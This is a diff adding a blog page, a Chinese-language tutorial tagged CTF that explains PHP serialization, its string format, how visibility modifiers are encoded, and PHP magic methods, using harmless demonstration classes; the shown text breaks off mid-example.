@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="en-uk" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='PHP 序列化与反序列化 PHP程序为了保护和转储对象 object，提供了序列化 serialize的方法，其将一个对象转换成字符串，但仅保留对象里的'><title>PHP 序列化与反序列化</title>
+
+<link rel='canonical' href='https://ginkgo.org.cn/posts/php_serialize_unserialize/'>
+
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='PHP 序列化与反序列化'>
+<meta property='og:description' content='PHP 序列化与反序列化 PHP程序为了保护和转储对象 object，提供了序列化 serialize的方法，其将一个对象转换成字符串，但仅保留对象里的'>
+<meta property='og:url' content='https://ginkgo.org.cn/posts/php_serialize_unserialize/'>
+<meta property='og:site_name' content='Under The Ginkgo'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='php' /><meta property='article:tag' content='serialize' /><meta property='article:tag' content='unserialize' /><meta property='article:tag' content='magic_functions' /><meta property='article:published_time' content='2022-06-14T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-06-15T15:26:01&#43;01:00'/>
+<meta name="twitter:title" content="PHP 序列化与反序列化">
+<meta name="twitter:description" content="PHP 序列化与反序列化 PHP程序为了保护和转储对象 object，提供了序列化 serialize的方法，其将一个对象转换成字符串，但仅保留对象里的">
+    <link rel="shortcut icon" href="/img/favicon.ico" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-ZKEXSTS2N4', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
+                            height="237" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧐</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
+            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/medic0803'
+                        target="_blank"
+                        title="A_GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='mailto:medicwrf@gmail.com'
+                        target="_blank"
+                        title="B_E-mail"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/php_serialize_unserialize/">PHP 序列化与反序列化</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jun 14, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    7 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="php-序列化与反序列化">PHP 序列化与反序列化</h2>
+<p>PHP程序为了保护和转储对象 object，提供了序列化 serialize的方法，其将一个对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法 <!-- raw HTML omitted --></p>
+<p>PHP序列化的函数为 <code>serialize</code>, 反序列化的函数为 <code>unserialize</code> <!-- raw HTML omitted --></p>
+<h3 id="serialize-序列化">Serialize 序列化</h3>
+<p>什么序列化呢，我们直接通过一个例子来看一下 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="o">=</span><span class="s2">&#34;ThisA&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$b</span><span class="o">=</span><span class="s2">&#34;ThisB&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$c</span><span class="o">=</span><span class="s2">&#34;ThisC&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">test1</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;this is test1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$test</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>序列化后就会产生如下的字节流，其主要目的是为了保存PHP中所有的类，方法，变量的类型以及他们所组成的结构 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-06-14_10-12-06_screenshot.png"
+         alt="Figure 1: serialize()" width="500px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 1: <!-- raw HTML omitted -->serialize()</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">serialize(mixed $value): string
+</span></span></code></pre></div><h3 id="序列化后的字节流详解">序列化后的字节流详解</h3>
+<p>接着我们具体来分析一下这一串字节流代表什么内容 <!-- raw HTML omitted --></p>
+<ul>
+<li><code>O</code> 表示 object 对象， <code>:4</code> 表示对象名的长度有4个字符 <!-- raw HTML omitted --></li>
+<li><code>:&quot;Test&quot;</code> 表示对象的名称， <code>:3</code> 表示该对象中有3个成员变量 <!-- raw HTML omitted --></li>
+<li>通过括号来表示结果，表示接下来是对象里面的成员变量，因为变量涉及到变量名以及变量的值，因此它们都会被序列化，并用 <code>;</code> 来进行分割： <!-- raw HTML omitted -->
+<ul>
+<li><code>s:1:&quot;a&quot;</code> 是序列化变量名的结果 <!-- raw HTML omitted -->
+<ul>
+<li><code>s</code> 表示是字符串， <code>1</code> 表示只有一个字符， <code>:&quot;a&quot;</code> 表示值为 <code>a</code> 其他同理可得 <!-- raw HTML omitted --></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>我们可以观察到后面的变量名和变量值也是一一对应的，但是变量名的表示根据 <code>Access Modifiers, 访问控制修饰符</code> 的不同而有不同的表示方法 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span><span class="p">(</span><span class="nx">公有</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="k">protected</span><span class="p">(</span><span class="nx">受保护</span><span class="p">)</span>     <span class="c1">// %00*%00属性名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">private</span><span class="p">(</span><span class="nx">私有的</span><span class="p">)</span>       <span class="c1">// %00类名%00属性名
+</span></span></span></code></pre></div><p>protected属性被序列化的时候属性值会变成 <code>%00*%00属性名</code> <!-- raw HTML omitted -->
+private属性被序列化的时候属性值会变成 <code>%00类名%00属性名</code> <!-- raw HTML omitted --></p>
+<p>（%00为空白符，空字符也有长度，一个空字符长度为 1） <!-- raw HTML omitted --></p>
+<p>就如同我们这里的结果： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">s:4:&#34;*b&#34;; = s:4:&#34;%00*%00b&#34;;
+</span></span><span class="line"><span class="cl">s:7:&#34;Testc&#34;; = s:7:&#34;%00Test%00c&#34;;
+</span></span></code></pre></div><h3 id="unserialize-反序列化">Unserialize 反序列化</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;This A&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">&#39;This B&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$c</span> <span class="o">=</span> <span class="s1">&#39;This C&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">test</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;this is test&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">     <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sTest</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$usTest</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$sTest</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nv">$usTest</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>结果如下： <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-06-14_14-47-02_screenshot.png"
+         alt="Figure 2: unserialize 反序列化" width="500px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 2: <!-- raw HTML omitted -->unserialize 反序列化</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>我们看反序列化后的内容就可以更好的理解为什么要进行序列化 <!-- raw HTML omitted --></p>
+<h3 id="magic-methods-魔术方法">Magic Methods 魔术方法</h3>
+<p>很多教程都提到了魔术方法的概念，但没有进行定义和解释，官网的定义总结如下： <!-- raw HTML omitted --></p>
+<p>魔术方法是定义在类内部的以 <code>__</code> 开头的方法，通过对魔术方法的实现可以重写PHP对于对象的默认操作，例如序列化等 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">__construct</span><span class="p">()</span>   <span class="c1">#类似C++构造函数,当一个对象创建时被调用,但在unserialize()时是不会自动调用的
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__destruct</span><span class="p">()</span>    <span class="c1">#当一个对象没有后续被引用时，被调用（注意说销毁并不准确），当一个对象的
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__toString</span><span class="p">()</span>    <span class="c1">#当一个对象被当作一个字符串使用时被调用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__invoke</span><span class="p">()</span>      <span class="c1">#当脚本尝试将对象调用为函数时触发
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__sleep</span><span class="p">()</span>       <span class="c1">#serialize()时会自动调用   
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__wakeup</span><span class="p">()</span>      <span class="c1">#unserialize()时会自动调用   
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__call</span><span class="p">()</span>        <span class="c1">#当调用对象中不存在的方法会自动调用该方法。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__get</span><span class="p">()</span>         <span class="c1">#在调用私有属性的时候会自动执行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__set</span><span class="p">()</span>         <span class="c1">#用于将数据写入不可访问的属性（根据Access modifilers来判断,e.g., protected, private）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__isset</span><span class="p">()</span>       <span class="c1">#在不可访问的属性上调用isset()或empty()触发
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">__unset</span><span class="p">()</span>       <span class="c1">#在不可访问的属性上使用unset()时触发
+</span></span></span></code></pre></div><p>我们来举个例子看看这些魔术方法如何对反序列化造成影响 <!-- raw HTML omitted --></p>
+<p>继续沿用我们上面的例子 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;This A&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">&#39;This B&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$c</span> <span class="o">=</span> <span class="s1">&#39;This C&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">test</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;this is test&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">c</span><span class="o">=</span><span class="s1">&#39;This is not c&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sTest</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$test</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$usTest</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$sTest</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$usTest</span><span class="p">);</span>
+</span></span></code></pre></div><p>我们通过实现一个 <code>__wakeup</code> 方法，其会在反序列化时自动被调用，同时修改 <code>$c</code> 的值 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-06-14_15-04-43_screenshot.png"
+         alt="Figure 3: __wakeup()" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 3: <!-- raw HTML omitted -->__wakeup()</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>建议大家可以单步调试一下下面的代码，可以有助于理解每一个魔术方法的具体作用 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 设置一个类A
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">A</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;V0W&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;__construct() call</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">__destruct() call</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;__toString() call</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__sleep</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;__sleep() call</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;__wakeup() call</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;__get() call</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$property</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>   <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">__set() call</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$property</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;__invoke() call</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//调用 __construct()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">A</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//调用 __toSting()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//调用 __sleep()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$b</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//调用 __wakeup()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$c</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//不存在这个bbbb属性，调用 __get()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nv">$a</span><span class="o">-&gt;</span><span class="na">bbbb</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//name是私有变量，不允许修改，调用 __set()
